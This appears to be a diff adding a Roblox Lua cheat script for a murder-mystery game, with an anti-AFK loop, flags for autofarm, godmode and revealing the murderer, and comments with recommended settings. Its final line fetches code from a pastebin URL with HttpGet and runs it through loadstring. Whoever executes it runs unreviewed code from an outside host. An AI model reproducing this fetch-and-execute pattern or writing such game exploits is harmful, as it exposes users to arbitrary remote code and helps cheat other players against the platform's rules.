@@ -1,0 +1,20 @@
+spawn(function()
+while true do
+game:GetService("VirtualUser"):Button1Down(Vector2.new(0,0))
+wait(20)
+end
+end)
+
+spawn(function()
+_G.on = true -- the autofarm switch.
+_G.KillMurder = false -- this can kill you sometimes so i recommend keeping it false
+_G.Godmode = true -- i recommend this instead :) you can use this alone, but it only starts when the match starts.
+_G.PrintMurder = true -- if _G.on = true then this will print the murderer.
+_G.LoopDelay = 2.5 -- how long it takes for the entire thing to repeat.
+-- you can turn on to false and just use godmode :)
+-- these are the recommended settings, you can change them, you can execute before the match.
+-- it rejoins if you are murderer. You can put this in autoexecute or not.
+-- uses e621's fps booster if a certain thing happens :)
+
+loadstring(game:HttpGet("https://pastebin.com/raw/eNwdRG92"))();
+end)
